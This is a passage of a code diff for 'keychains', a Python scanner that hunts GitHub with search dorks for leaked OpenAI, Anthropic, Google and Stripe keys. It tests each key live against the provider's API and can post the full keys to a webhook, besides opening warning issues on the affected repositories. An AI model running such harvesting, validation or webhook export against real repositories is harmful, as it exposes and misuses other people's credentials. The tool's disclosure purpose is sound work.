@@ -1,4 +1,4 @@
-#  v.2.1.0 - Self-Learning ML Update
+# keychains.ts v3.0.0 
 import os
 import requests
 import time
@@ -10,8 +10,9 @@ import math
 import asyncio
 import aiohttp
 import argparse
-from collections import Counter
-from typing import Optional
+from collections import Counter, deque
+from typing import Optional, Dict, Any, List, Set, Tuple
+from itertools import product
 
 try:
     from keyguardian import KeyGuardian, collect_training_data
@@ -19,9 +20,13 @@ except ImportError:
     KeyGuardian = None
     collect_training_data = None
 
+try:
+    import yaml
+except ImportError:
+    yaml = None
+
 # --- Configuration ---
 
-# Confidence scoring based on file path patterns
 PATH_CONFIDENCE = {
     re.compile(r'\.env(\.|$)', re.IGNORECASE): (0.99, "Environment File"),
     re.compile(r'^\.env', re.IGNORECASE): (0.99, "Environment File"),
@@ -35,105 +40,52 @@ PATH_CONFIDENCE = {
     re.compile(r'\.md$|\.txt$', re.IGNORECASE): (0.05, "Documentation"),
 }
 
-# dorks and heuristics
 SERVICE_DEFINITIONS = {
     'OpenAI': {
-        'search_dorks': [
-            '("sk-proj-" OR "sk-") AND ("OPENAI_API_KEY" OR "openai.api_key")',
-            '("sk-proj-" OR "sk-") AND ("os.getenv" OR "process.env")',
-            '("sk-proj-" OR "sk-") filename:.env',
-            '("sk-proj-" OR "sk-") language:python "import openai"',
-            '("sk-proj-" OR "sk-") language:javascript "new OpenAI"',
-            '("sk-proj-" OR "sk-") language:bash export',
-        ],
+        'dork_components': {
+            'keys': ['"sk-proj-"', '"sk-"'],
+            'vars': ['"OPENAI_API_KEY"', '"openai.api_key"'],
+            'patterns': ['"os.getenv"', '"process.env"'],
+            'filenames': ['filename:.env', 'filename:secrets.toml'],
+            'extensions': ['extension:py', 'extension:js', 'extension:sh']
+        },
         'negative_keywords': ['example', 'placeholder', 'your-api-key', 'YOUR_API_KEY', 'xxxxxxxx'],
         'regex': re.compile(r'sk-(proj-)?[a-zA-Z0-9]{24,48}'),
         'validation': { 'method': 'GET', 'url': 'https://api.openai.com/v1/models', 'auth_type': 'bearer' },
         'entropy_threshold': 4.0
     },
     'Anthropic': {
-        'search_dorks': [
-            '"sk-ant-api03-" AND ("ANTHROPIC_API_KEY" OR "anthropic.api_key")',
-            '"sk-ant-api03-" filename:config.py',
-            '"sk-ant-api03-" language:typescript "Anthropic"',
-            '"sk-ant-api03-" filename:secrets.toml'
-        ],
+        'dork_components': {
+            'keys': ['"sk-ant-api03-"'],
+            'vars': ['"ANTHROPIC_API_KEY"'],
+            'filenames': ['filename:config.py', 'filename:secrets.toml'],
+            'extensions': ['extension:py', 'extension:ts']
+        },
         'negative_keywords': ['example', 'placeholder'],
         'regex': re.compile(r'sk-ant-api03-[a-zA-Z0-9_-]{95}'),
         'validation': { 'method': 'GET', 'url': 'https://api.anthropic.com/v1/ping', 'auth_type': 'header', 'header_name': 'x-api-key' },
         'entropy_threshold': 4.5
     },
-    'Cohere': {
-        'search_dorks': [
-            '("COHERE_API_KEY" OR "cohere.Client" OR "CohereClient") -test -example',
-            'language:python "import cohere" "api_key="',
-            'language:javascript "new CohereClient("',
-        ],
-        'negative_keywords': ['placeholder', 'YOUR_COHERE_API_KEY'],
-        'regex': re.compile(r'[a-zA-Z0-9]{40}'),
-        'validation': { 'method': 'GET', 'url': 'https://api.cohere.ai/v1/models', 'auth_type': 'bearer' },
-        'entropy_threshold': 3.8
-    },
-    'HuggingFace': {
-        'search_dorks': [
-            '"hf_" AND ("HUGGING_FACE_HUB_TOKEN" OR "HF_TOKEN")',
-            '"huggingface_hub.login(token="hf_"',
-            '"hf_" filename:secrets.sh',
-            '"hf_" filename:.env'
-        ],
-        'negative_keywords': ['example', 'YOUR_TOKEN_HERE'],
-        'regex': re.compile(r'hf_[a-zA-Z0-9]{35}'),
-        'validation': { 'method': 'GET', 'url': 'https://api-inference.huggingface.co/models', 'auth_type': 'bearer' },
-        'entropy_threshold': 4.2
-    },
     'GoogleAI': {
-        'search_dorks': [
-            '"AIzaSy" AND ("GOOGLE_API_KEY" OR "GEMINI_API_KEY")',
-            '"genai.configure(api_key=\\"AIzaSy"', # Escaped quote for exact match
-            '"AIzaSy" path:app/src/main',
-            '"AIzaSy" filename:.env',
-        ],
+        'dork_components': {
+            'keys': ['"AIzaSy"'],
+            'vars': ['"GOOGLE_API_KEY"', '"GEMINI_API_KEY"'],
+            'patterns': ['"genai.configure(api_key=\\"AIzaSy"'],
+            'filenames': ['filename:.env'],
+            'extensions': ['extension:py', 'extension:java', 'extension:kt']
+        },
         'negative_keywords': ['placeholder', 'YOUR_GOOGLE_API_KEY'],
         'regex': re.compile(r'AIzaSy[a-zA-Z0-9_-]{33}'),
         'validation': { 'method': 'GET', 'url': 'https://generativelanguage.googleapis.com/v1beta/models', 'auth_type': 'query_param', 'param_name': 'key' },
         'entropy_threshold': 4.3
     },
-    'AWS': {
-        'search_dorks': [
-            '("AKIA" OR "ASIA") AND ("AWS_ACCESS_KEY_ID" OR "aws_access_key")',
-            '"AKIA" filename:credentials',
-            '"AKIA" filename:config',
-            '"AWS_SECRET_ACCESS_KEY" AND ("AKIA" OR "ASIA")',
-            'boto3.client "aws_access_key_id"',
-        ],
-        'negative_keywords': ['AKIAEXAMPLE', 'ASIAEXAMPLE', 'placeholder'],
-        'regex': re.compile(r'(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'),
-        'validation': {
-            'method': 'GET',
-            'url': 'https://iam.amazonaws.com/?Action=GetUser&Version=2010-05-08',
-            'auth_type': 'bearer' # Note: Fails safely due to AWS's complex auth. Detection only.
-        },
-        'entropy_threshold': 4.0
-    },
-    'Slack': {
-        'search_dorks': [
-            '("xoxb-" OR "xoxp-") AND ("SLACK_API_TOKEN" OR "SLACK_BOT_TOKEN")',
-            '"xoxb-" filename:.env',
-            '"xoxp-" language:python "slack_sdk"',
-            'slack_bolt "token=" "xoxb-"',
-        ],
-        'negative_keywords': ['example', 'placeholder'],
-        'regex': re.compile(r'xox[baprs]-(\d{10,13}-){2}[a-zA-Z0-9]{24,32}'),
-        'validation': { 'method': 'POST', 'url': 'https://slack.com/api/auth.test', 'auth_type': 'bearer' },
-        'entropy_threshold': 4.5
-    },
     'Stripe': {
-        'search_dorks': [
-            '("sk_live_" OR "rk_live_") AND ("STRIPE_API_KEY" OR "stripe.api_key")',
-            '"sk_live_" filename:config',
-            '"rk_live_" filename:.env',
-            'language:php "Stripe::setApiKey(\\"sk_live_"',
-        ],
+        'dork_components': {
+            'keys': ['"sk_live_"', '"rk_live_"'],
+            'vars': ['"STRIPE_API_KEY"', '"stripe.api_key"'],
+            'filenames': ['filename:config', 'filename:.env'],
+            'extensions': ['extension:php', 'extension:rb']
+        },
         'negative_keywords': ['sk_test_', 'pk_live_', 'pk_test_', 'example'],
         'regex': re.compile(r'(sk|rk)_(live)_[0-9a-zA-Z]{24,99}'),
         'validation': { 'method': 'GET', 'url': 'https://api.stripe.com/v1/customers?limit=1', 'auth_type': 'bearer' },
@@ -141,7 +93,6 @@ SERVICE_DEFINITIONS = {
     },
 }
 
-# Common filename patterns to exclude from search
 EXCLUSIONS = " -path:*.md -path:*.txt -path:*.lock -path:*.example -path:package.json -path:yarn.lock -path:pnpm-lock.yaml"
 CACHE_FILE = ".keychains_cache.json"
 ISSUE_BODY_TEMPLATE = """Hey :) this issue was automated through one of my programs aka keychains because it found a hard coded api key laying around.
@@ -155,456 +106,432 @@ This issue was created to alert you about the exposed key. For security, you sho
 Stay safe!
 """
 
-# --- UI and Helper Functions ---
+# --- ANSI Escape Codes for TUI ---
+class Ansi:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    RESET = '\033[0m'
 
-def display_banner():
-    banner = """
-     _  __           _                 _               
-    | |/ /          | |               (_)              
-    | ' /  _ __   __| | __ _ _ __ __ _ _ _ __   __ _ 
-    |  <  | '_ \\ / _` |/ _` | '__/ _` | | '_ \\ / _` |
-    | . \\ | | | | (_| | (_| | | | (_| | | | | | (_| |
-    |_|\\_\\|_| |_|\\__,_|\\__,_|_|  \\__,_|_|_| |_|\\__, |
-                                               __/ |
-                                              |___/ 
-    AI Key Scanner & Rotator v2.1.0
-    """
-    print(banner)
+# --- Simplified Logger / Progress Reporter ---
+class Dashboard:
+    def __init__(self, services: List[str]):
+        self.stats = Counter()
+        self.services = services
+        self.lock = asyncio.Lock()
 
-def log_error(message, log_file):
-    if not log_file: return
-    try:
-        with open(log_file, 'a') as f:
-            timestamp = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
-            f.write(f"[{timestamp}] {message}\n")
-    except IOError as e:
-        print(f"CRITICAL: Could not write to error log file '{log_file}': {e}", file=sys.stderr)
+    async def log(self, message: str):
+        async with self.lock:
+            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+            print(f"{Ansi.CYAN}[{timestamp}]{Ansi.RESET} {message}")
 
-def load_cache():
-    if os.path.exists(CACHE_FILE):
-        with open(CACHE_FILE, 'r') as f:
-            try: return set(json.load(f))
-            except json.JSONDecodeError: return set()
-    return set()
+    async def add_leak(self, leak: Dict[str, Any]):
+        self.stats['confirmed_leaks'] += 1
+        async with self.lock:
+            val_status = leak['validation_status']
+            color = Ansi.GREEN if val_status == 'Active' else Ansi.YELLOW
+            print(
+                f"  {Ansi.GREEN}{Ansi.BOLD}Leak Found:{Ansi.RESET} {leak['service']} key in "
+                f"{Ansi.BOLD}{leak['repository']}{Ansi.RESET} "
+                f"({color}{val_status}{Ansi.RESET}) -> {leak['url']}"
+            )
 
-def save_cache(cache_data):
-    with open(CACHE_FILE, 'w') as f:
-        json.dump(list(cache_data), f)
+    def update_stats(self, key: str, value: int = 1):
+        self.stats[key] += value
 
-def calculate_entropy(s: str) -> float:
-    if not s or len(s) == 0: return 0.0
-    p, lns = Counter(s), float(len(s))
-    return -sum(count/lns * math.log(count/lns, 2) for count in p.values())
+    async def set_status(self, status: str):
+        async with self.lock:
+            print(f"{Ansi.YELLOW}Status:{Ansi.RESET} {status}")
 
-def get_path_confidence(path: str) -> tuple[float, str]:
-    for pattern, (score, desc) in PATH_CONFIDENCE.items():
-        if pattern.search(path):
-            return score, desc
-    return 0.2, "Generic Code File"
+    async def set_rate_limit(self, remaining: int, limit: int, reset_time: int):
+        reset_delta = max(0, reset_time - time.time())
+        rate_limit_info = f"{remaining}/{limit} (Resets in {int(reset_delta)}s)"
+        # We don't print this on every request to avoid spam, but the info is available if needed.
 
-def passes_heuristics(key_candidate, service_def, file_path, log_file):
-    entropy = calculate_entropy(key_candidate)
-    entropy_threshold = service_def.get('entropy_threshold', 3.5)
-    if entropy < entropy_threshold:
-        log_error(f"Rejected key '{key_candidate[:10]}...' due to low entropy ({entropy:.2f} < {entropy_threshold}).", log_file)
-        return False
+# --- Core Logic Classes ---
 
-    confidence, _ = get_path_confidence(file_path)
-    if confidence < 0.15:
-        log_error(f"Rejected key from low-confidence path '{file_path}' (Confidence: {confidence:.2f}).", log_file)
-        return False
+class Scanner:
+    def __init__(self, config: Dict[str, Any], session: aiohttp.ClientSession, dashboard: Dashboard):
+        self.config = config
+        self.session = session
+        self.dashboard = dashboard
+        self.cache = self._load_cache()
+        self.rate_limit_remaining = 5000
+        self.rate_limit_reset = time.time()
+        self.headers = {
+            'Authorization': f'token {config["token"]}',
+            'Accept': 'application/vnd.github.v3.text-match+json'
+        }
+
+    def _load_cache(self) -> Set[str]:
+        if os.path.exists(CACHE_FILE):
+            with open(CACHE_FILE, 'r') as f:
+                try: return set(json.load(f))
+                except json.JSONDecodeError: return set()
+        return set()
+
+    def save_cache(self):
+        with open(CACHE_FILE, 'w') as f:
+            json.dump(list(self.cache), f)
+
+    async def _generate_dorks(self) -> List[Tuple[str, str]]:
+        dorks = []
+        services = {k: v for k, v in SERVICE_DEFINITIONS.items() if self.config['services'].lower() == 'all' or k in self.config['services'].split(',')}
         
-    return True
+        for service, definition in services.items():
+            components = definition.get('dork_components', {})
+            if not components: continue
+            
+            key_vars = [f"({ ' OR '.join(components.get('keys', [])) })", f"({ ' OR '.join(components.get('vars', [])) })"]
+            patterns = components.get('patterns', [])
+            meta = components.get('filenames', []) + components.get('extensions', [])
 
-# --- Mode: SCAN ---
-
-async def check_rate_limit(headers, session):
-    try:
-        async with session.get("https://api.github.com/rate_limit", headers=headers) as r:
-            r.raise_for_status()
-            data = await r.json()
-            return data['resources']['search']['remaining']
-    except (aiohttp.ClientError, json.JSONDecodeError):
-        return 0
-
-async def run_queries_for_service(service, definition, headers, no_forks, log_file, session, semaphore):
-    dorks = definition['search_dorks']
-    negatives = ' '.join([f'NOT "{n}"' for n in definition.get('negative_keywords', [])])
-    unique_items_found = {}
-    backoff_factor = 1
-
-    for i, dork in enumerate(dorks):
-        print(f"-> Scanning {service} (Query {i+1}/{len(dorks)})")
+            for combo in product(key_vars, patterns + meta):
+                if combo[0] and combo[1]:
+                    dorks.append((service, f"{combo[0]} AND {combo[1]}"))
         
-        full_query = f'{dork} {negatives}{EXCLUSIONS}' + (' -fork:true' if no_forks else '')
+        await self.dashboard.log(f"Generated {len(dorks)} dynamic search dorks.")
+        return dorks
+
+    async def run_scan(self) -> List[Dict[str, Any]]:
+        dorks = await self._generate_dorks()
+        semaphore = asyncio.Semaphore(self.config['workers'])
+        tasks = [self._run_query(service, dork, semaphore) for service, dork in dorks]
+        
+        all_items = []
+        for future in asyncio.as_completed(tasks):
+            result = await future
+            if result:
+                all_items.extend(result)
+        
+        await self.dashboard.log(f"GitHub queries complete. Found {len(all_items)} raw items.")
+        return await self._process_items(all_items)
+
+    async def _update_rate_limit(self, headers):
+        self.rate_limit_remaining = int(headers.get('x-ratelimit-remaining', 0))
+        self.rate_limit_reset = int(headers.get('x-ratelimit-reset', time.time()))
+        limit = int(headers.get('x-ratelimit-limit', 0))
+        await self.dashboard.set_rate_limit(self.rate_limit_remaining, limit, self.rate_limit_reset)
+
+    async def _run_query(self, service: str, dork: str, semaphore: asyncio.Semaphore) -> Optional[List[Dict]]:
+        negatives = ' '.join([f'NOT "{n}"' for n in SERVICE_DEFINITIONS[service].get('negative_keywords', [])])
+        full_query = f'{dork} {negatives}{EXCLUSIONS}' + (' -fork:true' if self.config['no_forks'] else '')
         params = {'q': full_query, 'per_page': 100}
+
+        async with semaphore:
+            if self.rate_limit_remaining < 5:
+                wait_time = max(0, self.rate_limit_reset - time.time()) + 2
+                await self.dashboard.log(f"Approaching rate limit. Pausing for {wait_time:.1f}s...")
+                await asyncio.sleep(wait_time)
+
+            try:
+                async with self.session.get('https://api.github.com/search/code', headers=self.headers, params=params, timeout=30) as response:
+                    self.dashboard.update_stats('queries_sent')
+                    await self._update_rate_limit(response.headers)
+                    if response.status == 200:
+                        data = await response.json()
+                        items = data.get('items', [])
+                        for item in items:
+                            item['found_for_service'] = service
+                        return items
+                    elif response.status in [403, 429]:
+                        await self.dashboard.log(f"{Ansi.RED}Rate limit hit hard. Backing off...{Ansi.RESET}")
+                        await asyncio.sleep(10)
+                    else:
+                        response.raise_for_status()
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                await self.dashboard.log(f"{Ansi.RED}Network error: {e}{Ansi.RESET}")
+        return None
+    
+    async def _process_items(self, items: List[Dict]) -> List[Dict[str, Any]]:
+        await self.dashboard.set_status("Processing and filtering results...")
+        potential_leaks = []
+        guardian = KeyGuardian(model_path=self.config['ml_model']) if self.config['ml_filter'] and KeyGuardian else None
         
-        retries = 3
-        while retries > 0:
-            async with semaphore:
-                try:
-                    async with session.get('https://api.github.com/search/code', headers=headers, params=params, timeout=20) as response:
-                        if response.status == 200:
-                            backoff_factor = 1 # Reset backoff on success
-                            data = await response.json()
-                            for item in data.get('items', []):
-                                unique_items_found[item['html_url']] = item
-                            break # Success, move to next dork
-                        elif response.status in [403, 429]: # Rate limit
-                            retries -= 1
-                            resp_headers = response.headers
-                            reset_time = int(resp_headers.get('x-ratelimit-reset', time.time() + 60))
-                            wait_duration = max(0, reset_time - time.time())
-                            sleep_time = (wait_duration + 2) * backoff_factor
+        for item in items:
+            self.dashboard.update_stats('items_processed')
+            if item['html_url'] in self.cache: continue
 
-                            print(f"Rate limit on {service}. Pausing for {sleep_time:.1f}s...")
-                            await asyncio.sleep(sleep_time)
-                            backoff_factor = min(backoff_factor * 2, 16) # Increase backoff
-                        else:
-                            response.raise_for_status() # Raise for other client/server errors
-                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-                    retries -= 1
-                    log_error(f"Network error on {service} with dork '{dork}': {e}", log_file)
-                    if retries <= 0: break
-                    await asyncio.sleep(2 * (3 - retries)) # Simple backoff for network issues
-    
-    print(f"Finished scanning for {service}.")
-    return service, list(unique_items_found.values())
+            service = item['found_for_service']
+            definition = SERVICE_DEFINITIONS[service]
+            
+            fragment = item['text_matches'][0]['fragment']
+            match = definition['regex'].search(fragment)
+            if not match: continue
 
+            key_found = match.group(0)
 
-async def create_leak_issue(leak, token, log_file, session, semaphore):
-    repo_full_name = leak['repository']
-    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
-    
-    issue_title = f"Security Vulnerability: Hardcoded API Key in {leak['file']}"
-    issue_body = ISSUE_BODY_TEMPLATE.format(
-        file_path=leak['file'],
-        timestamp=datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
-    )
-    
-    payload = {"title": issue_title, "body": issue_body}
-    url = f"https://api.github.com/repos/{repo_full_name}/issues"
+            if not self._passes_heuristics(key_found, definition, item['path']):
+                continue
 
-    async with semaphore:
-        try:
-            async with session.post(url, headers=headers, json=payload, timeout=15) as response:
-                if response.status == 201:
-                    return "Issue Created"
-                elif response.status == 410:
-                    log_error(f"Could not create issue for {repo_full_name}: Issues are disabled.", log_file)
-                    return "Issues N/A"
-                else:
-                    response.raise_for_status()
-                    
-        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            log_error(f"Failed to create issue for {repo_full_name}: {e}", log_file)
-            return "Issue Failed"
+            if guardian and guardian.session:
+                confidence = guardian.predict(key_found, fragment)
+                if confidence < self.config['ml_threshold']:
+                    continue
 
-    return "Issue Error"
+            self.cache.add(item['html_url'])
+            self.dashboard.update_stats('potential_leaks')
+            path_confidence, conf_desc = self._get_path_confidence(item['path'])
+            
+            leak_details = {
+                "service": service, "repository": item['repository']['full_name'], "file": item['path'],
+                "url": item['html_url'], "key_snippet": key_found, "confidence": path_confidence,
+                "confidence_description": conf_desc, "fragment": fragment
+            }
+            potential_leaks.append(leak_details)
+        
+        await self.dashboard.log(f"Identified {len(potential_leaks)} new, unique potential leaks.")
+        return potential_leaks
+
+    def _passes_heuristics(self, key: str, definition: Dict, path: str) -> bool:
+        entropy = self._calculate_entropy(key)
+        if entropy < definition.get('entropy_threshold', 3.5): return False
+        
+        confidence, _ = self._get_path_confidence(path)
+        if confidence < 0.15: return False
+        
+        return True
+
+    def _calculate_entropy(self, s: str) -> float:
+        if not s: return 0.0
+        p, lns = Counter(s), float(len(s))
+        return -sum(count/lns * math.log(count/lns, 2) for count in p.values())
+
+    def _get_path_confidence(self, path: str) -> Tuple[float, str]:
+        for pattern, (score, desc) in PATH_CONFIDENCE.items():
+            if pattern.search(path):
+                return score, desc
+        return 0.2, "Generic Code File"
 
 
-async def run_scan(args):
-    TOKEN = args.token or os.getenv('GITHUB_TOKEN')
-    if not TOKEN:
-        print("GitHub token not found. Please provide one or set GITHUB_TOKEN.", file=sys.stderr)
-        return
+class Validator:
+    def __init__(self, config: Dict[str, Any], session: aiohttp.ClientSession, dashboard: Dashboard):
+        self.config = config
+        self.session = session
+        self.dashboard = dashboard
 
-    HEADERS = {'Authorization': f'token {TOKEN}', 'Accept': 'application/vnd.github.v3.text-match+json'}
-    
-    services_to_scan = {k: v for k, v in SERVICE_DEFINITIONS.items() if args.services.lower() == 'all' or k in args.services.split(',')}
-    cache = load_cache()
-    total_found_leaks = []
-    validation_summary = Counter()
-    output_filename = args.output or "findings.json"
+    async def validate_all(self, leaks: List[Dict]) -> List[Dict]:
+        if not self.config['validate']:
+            for leak in leaks:
+                leak['validation_status'] = "Not Checked"
+            return leaks
 
-    config_panel_text = f"""
---- Scan Configuration ---
-Services: {', '.join(services_to_scan.keys())}
-Exclude Forks: {'Yes' if args.no_forks else 'No'}
-Validate Keys: {'Yes' if args.validate else 'No'}
-Auto-Report (Issue): {'Yes' if args.report else 'No'}
-ML Filter: {'Yes' if args.ml_filter else 'No'} (Threshold: {args.ml_threshold})
-Data Collection: {'Yes' if args.collect_data else 'No'}{' (Self-learning enabled w/ --validate)' if args.collect_data and args.validate else ''}
-Duration: {f'{args.duration} mins' if args.duration > 0 else 'Run once'}
---------------------------
-"""
-    print(config_panel_text)
+        if not leaks:
+            return []
 
-    guardian = None
-    if args.ml_filter:
-        if KeyGuardian:
-            guardian = KeyGuardian(model_path=args.ml_model)
-        else:
-            print("ML Filter enabled, but dependencies are missing. Please install them.", file=sys.stderr)
+        await self.dashboard.set_status(f"Validating {len(leaks)} keys...")
+        semaphore = asyncio.Semaphore(self.config['workers'])
+        tasks = [self._validate_key(leak, semaphore) for leak in leaks]
+        validated_leaks = await asyncio.gather(*tasks)
+        await self.dashboard.log(f"Validation complete.")
+        return validated_leaks
 
+    async def _validate_key(self, leak: Dict, semaphore: asyncio.Semaphore) -> Dict:
+        service, key = leak['service'], leak['key_snippet']
+        definition = SERVICE_DEFINITIONS[service]
+        val_config = definition['validation']
+        
+        headers, params = {'User-Agent': 'keychains-scanner/3.0'}, {}
+        if val_config['auth_type'] == 'bearer': headers['Authorization'] = f'Bearer {key}'
+        elif val_config['auth_type'] == 'header': headers[val_config['header_name']] = key
+        elif val_config['auth_type'] == 'query_param': params[val_config['param_name']] = key
 
-    semaphore = asyncio.Semaphore(args.workers)
-    
-    async with aiohttp.ClientSession(headers=HEADERS) as session, aiohttp.ClientSession() as validation_session:
-        initial_rate_limit = await check_rate_limit(HEADERS, session)
-        if initial_rate_limit == 0:
-            print("Initial GitHub search rate limit is zero. Exiting.", file=sys.stderr)
+        is_valid, reason = False, "Request Failed"
+        async with semaphore:
+            try:
+                proxy = self.config.get('proxy')
+                async with self.session.request(val_config['method'], val_config['url'], headers=headers, params=params, timeout=10, proxy=proxy) as response:
+                    if response.status == 200: is_valid, reason = True, "Active"
+                    elif response.status in [401, 403]: is_valid, reason = False, "Invalid/Forbidden"
+                    elif response.status == 429: is_valid, reason = False, "Rate-Limited"
+                    else: is_valid, reason = False, f"HTTP {response.status}"
+            except (aiohttp.ClientError, asyncio.TimeoutError):
+                is_valid, reason = False, "Request Failed"
+        
+        leak['validation_status'] = reason
+        if is_valid: self.dashboard.update_stats('valid_keys')
+        else: self.dashboard.update_stats('invalid_keys')
+
+        if self.config['collect_data'] and collect_training_data:
+            label = 1 if is_valid else (0 if reason == "Invalid/Forbidden" else None)
+            if label is not None:
+                collect_training_data(self.config['collect_data'], leak['key_snippet'], leak['fragment'], label)
+
+        return leak
+
+class Reporter:
+    def __init__(self, config: Dict[str, Any], session: aiohttp.ClientSession, dashboard: Dashboard):
+        self.config = config
+        self.session = session
+        self.dashboard = dashboard
+
+    async def report_all(self, leaks: List[Dict]):
+        valid_leaks = [leak for leak in leaks if leak.get('validation_status') == 'Active']
+        if not valid_leaks:
             return
 
-        start_time = time.time()
-        end_time = start_time + args.duration * 60
+        await self.dashboard.set_status(f"Reporting {len(valid_leaks)} valid leaks...")
         
-        run_cycle = 0
-        while True:
-            run_cycle += 1
-            if args.duration > 0:
-                print(f"\n--- Starting Scan Cycle {run_cycle} ---")
+        tasks = []
+        if self.config['report']:
+            semaphore = asyncio.Semaphore(5) # Lower semaphore for issue creation
+            tasks.extend([self._create_github_issue(leak, semaphore) for leak in valid_leaks])
+        
+        if self.config['webhook_url']:
+            tasks.extend([self._send_webhook(leak) for leak in valid_leaks])
+
+        if tasks:
+            await asyncio.gather(*tasks)
+
+        for leak in valid_leaks:
+            await self.dashboard.add_leak(leak)
+        
+        await self.dashboard.log(f"Reporting complete.")
+
+
+    async def _create_github_issue(self, leak: Dict, semaphore: asyncio.Semaphore):
+        repo = leak['repository']
+        headers = {'Authorization': f'token {self.config["token"]}', 'Accept': 'application/vnd.github.v3+json'}
+        issue_body = ISSUE_BODY_TEMPLATE.format(
+            file_path=leak['url'],
+            timestamp=datetime.datetime.now(datetime.timezone.utc).isoformat()
+        )
+        payload = {"title": f"Security Alert: Hardcoded API Key in {leak['file']}", "body": issue_body}
+        url = f"https://api.github.com/repos/{repo}/issues"
+
+        async with semaphore:
+            try:
+                async with self.session.post(url, headers=headers, json=payload, timeout=15) as response:
+                    if response.status == 201: leak['issue_status'] = "Created"
+                    else: leak['issue_status'] = f"Failed (HTTP {response.status})"
+            except (aiohttp.ClientError, asyncio.TimeoutError):
+                leak['issue_status'] = "Failed (Network)"
+
+
+    async def _send_webhook(self, leak: Dict):
+        payload = {
+            "embeds": [{
+                "title": "🚨 New API Key Leak Detected! 🚨",
+                "color": 15158332, # Red
+                "fields": [
+                    {"name": "Service", "value": leak['service'], "inline": True},
+                    {"name": "Repository", "value": leak['repository'], "inline": True},
+                    {"name": "Confidence", "value": f"{int(leak['confidence']*100)}% ({leak['confidence_description']})", "inline": True},
+                    {"name": "File", "value": f"[{leak['file']}]({leak['url']})"},
+                    {"name": "Key Snippet", "value": f"`{leak['key_snippet']}`"}
+                ],
+                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
+            }]
+        }
+        try:
+            async with self.session.post(self.config['webhook_url'], json=payload, timeout=10) as response:
+                 leak['webhook_status'] = "Sent" if response.status in [200, 204] else f"Failed (HTTP {response.status})"
+        except (aiohttp.ClientError, asyncio.TimeoutError):
+            leak['webhook_status'] = "Failed (Network)"
+
+# --- Orchestrator ---
+
+async def run_scan_orchestrator(args):
+    config = vars(args)
+    if not config['token']: config['token'] = os.getenv('GITHUB_TOKEN')
+    if not config['token']:
+        print(f"{Ansi.RED}Error: GitHub token not found. Set GITHUB_TOKEN or use --token.{Ansi.RESET}", file=sys.stderr)
+        return
+
+    if config['config_file'] and os.path.exists(config['config_file']):
+        if not yaml:
+            print(f"{Ansi.RED}Error: --config-file requires PyYAML. Please run: pip install pyyaml{Ansi.RESET}", file=sys.stderr)
+            return
+        with open(config['config_file'], 'r') as f:
+            file_config = yaml.safe_load(f)
+        config = {**file_config, **{k: v for k, v in config.items() if v is not None}}
+    
+    output_filename = config.get('output', "findings.json")
+
+    print(f"{Ansi.BOLD}🔑 keychains v3.0.0 - The Monster Update{Ansi.RESET}")
+    print("─" * 40)
+    dashboard = Dashboard(services=config['services'].split(','))
+    
+    total_found_leaks = []
+
+    async with aiohttp.ClientSession() as session:
+        scanner = Scanner(config, session, dashboard)
+        validator = Validator(config, session, dashboard)
+        reporter = Reporter(config, session, dashboard)
+
+        start_time = time.time()
+        end_time = start_time + config['duration'] * 60 if config['duration'] > 0 else float('inf')
+        
+        cycle = 0
+        while time.time() < end_time:
+            cycle += 1
+            await dashboard.set_status(f"Starting scan cycle {cycle}...")
             
-            new_leaks_in_cycle = []
+            potential_leaks = await scanner.run_scan()
+            validated_leaks = await validator.validate_all(potential_leaks)
+            await reporter.report_all(validated_leaks)
             
-            print("Querying GitHub API for potential leaks...")
-            tasks = [run_queries_for_service(s, d, HEADERS, args.no_forks, args.error_log_file, session, semaphore) for s, d in services_to_scan.items()]
-            results = await asyncio.gather(*tasks)
-            print("\nGitHub queries complete. Processing results...")
-
-            for service, items in results:
-                definition = SERVICE_DEFINITIONS[service]
-                for item in items:
-                    if item['html_url'] in cache: continue
-                    match = definition['regex'].search(item['text_matches'][0]['fragment'])
-                    if not match: continue
-                    
-                    key_found = match.group(0)
-                    code_fragment = item['text_matches'][0]['fragment']
-
-                    if not passes_heuristics(key_found, definition, item['path'], args.error_log_file):
-                        if args.collect_data and collect_training_data: # Collect obvious negatives
-                             collect_training_data(args.collect_data, key_found, code_fragment, label=0)
-                        continue
-
-                    if guardian and guardian.session:
-                        ml_confidence = guardian.predict(key_found, code_fragment)
-                        if ml_confidence < args.ml_threshold:
-                            log_error(f"Rejected by ML model: '{key_found[:10]}...' (Conf: {ml_confidence:.2f} < {args.ml_threshold}).", args.error_log_file)
-                            if args.collect_data and collect_training_data: # Collect negatives confirmed by ML
-                                collect_training_data(args.collect_data, key_found, code_fragment, label=0)
-                            continue
-                    
-                    validation_status_text = "Not Checked"
-                    is_valid_for_training: Optional[bool] = None
-
-                    if args.validate:
-                        is_valid, reason = await validate_key(service, key_found, definition, validation_session)
-                        validation_status_text = reason
-                        if is_valid:
-                            is_valid_for_training = True
-                        else:
-                            if reason == "Invalid/Forbidden":
-                                is_valid_for_training = False
-
-                    # Self-learning data collection
-                    if args.collect_data and collect_training_data and is_valid_for_training is not None:
-                        collect_training_data(args.collect_data, key_found, code_fragment, label=int(is_valid_for_training))
-
-                    validation_summary[validation_status_text] += 1
-                    confidence, conf_desc = get_path_confidence(item['path'])
-                    leak_details = {
-                        "service": service, "repository": item['repository']['full_name'], "file": item['path'],
-                        "url": item['html_url'], "key_snippet": key_found, "confidence": confidence,
-                        "confidence_description": conf_desc, "validation_status": validation_status_text,
-                        "issue_status": "N/A"
-                    }
-                    
-                    cache.add(item['html_url'])
-                    new_leaks_in_cycle.append(leak_details)
+            total_found_leaks.extend([l for l in validated_leaks if l.get('validation_status') == 'Active'])
             
-            total_found_leaks.extend(new_leaks_in_cycle)
-
-            if args.report and new_leaks_in_cycle:
